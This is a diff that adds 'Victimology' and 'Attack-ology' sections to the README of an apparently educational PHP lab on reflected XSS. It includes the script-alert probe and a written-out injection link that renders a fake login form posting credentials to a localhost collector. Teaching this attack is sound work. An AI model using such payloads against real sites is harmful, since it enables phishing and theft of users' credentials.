@@ -29,3 +29,28 @@ This repository contains not only php vulnerable code but also another version w
 7. When you enter you a username and password, those credentials are stored in a text file named *saved.txt*. The file simulates an attacker stealing usernames and passwords
 8. Going to the home page, you can click on the last link that switches the site between the sanitized and unsanitized version of the site
 9. You follow the same procedures but the difference is when you are redirected to the other login page, the page will show you that *you are not entering a username* 
+
+# Victimology
+1. User receives one of the links from ```phish.html```
+2. User clicks the link 
+3. User is presented a login page 
+   NOTE: The login page is NOT the attacker webpage. The webpage was rendered through the malicious links within phish.html
+4. User enters username and password 
+5. Attacker now has the victim's credentials
+
+# Attack-ology
+1. Attacker identifies a site that is vulnerable to Reflective XSS
+2. One way to identify that a site is vulnerable to Reflective XSS is through the *script tag - alert combo* (first link)
+3. Once the attacker sees a vulnerable site, the attack creates a link to render a login page utilizing the vulnerable site:
+Partially Encode URL link
+```
+ <a href="http://localhost:8080/welcome.php?username=
+    <div id=%22stealPassword%22>
+      Please Login:<form name=%22input%22 action=%22http://localhost:8080/credentials.php%22 method=%22post%22>
+      Username: <input type=%22text%22 name=%22username%22 />
+      <br/>
+      Password: <input type=%22password%22 name=%22password%22 />
+      <br/>
+      <input name=%22submit%22 type=%22submit%22 value=%22Login%22 /></form>
+    </div>">
+```
